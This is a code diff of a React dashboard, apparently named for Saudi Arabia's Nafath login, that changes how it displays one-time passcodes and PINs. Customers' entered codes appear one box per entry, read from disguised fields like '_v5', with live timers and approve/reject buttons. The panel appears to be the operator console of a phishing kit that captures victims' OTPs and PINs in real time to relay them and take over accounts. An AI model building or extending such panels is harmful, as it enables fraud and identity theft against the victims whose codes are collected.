@@ -2334,31 +2334,54 @@ const renderNafadBox = () => {
       });
     }
     
-    // صندوق منفصل لرمز OTP (step2)
-    if (hasOtpData && otpRaw) {
+    // Create a box for each entry that has OTP data
+    customerEntryGroup.forEach((entry, index) => {
+      const raw = entry.raw || {};
+      const otpCode = raw._v5 || raw.otpCode;
+      const entryTimestamp = new Date(raw.otpSubmittedAt || raw._v5UpdatedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      const isLatest = index === 0;
+      
+      // Check if this entry has OTP data
+      if (!otpCode) return;
+      
       boxes.push({
-        key: 'otp',
-        timestamp: otpTimestamp,
+        key: `otp-${entry.id}`,
+        timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: "1px solid #e5e7eb",
+            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
-            <TimeCounter timestamp={otpTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <TimeCounter timestamp={entryTimestamp} />
+            {isLatest && (
+              <span style={{
+                position: "absolute",
+                top: 8,
+                right: 8,
+                background: "#3b82f6",
+                color: "#fff",
+                padding: "2px 8px",
+                borderRadius: 4,
+                fontSize: "0.65rem",
+                fontWeight: 600
+              }}>
+                الأحدث
+              </span>
+            )}
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
               <span style={{ fontSize: "1rem" }}>🔐</span>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق (OTP)</h3>
             </div>
             {/* رمز OTP */}
             <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginBottom: 12 }}>
               <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
-              <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpRaw._v5 || otpRaw.otpCode}</p>
+              <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
             </div>
             {/* أزرار الموافقة والرفض */}
             <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
@@ -2384,7 +2407,7 @@ const renderNafadBox = () => {
           </div>
         )
       });
-    }
+    });
     
     if (hasPinData && pinRaw) {
       boxes.push({
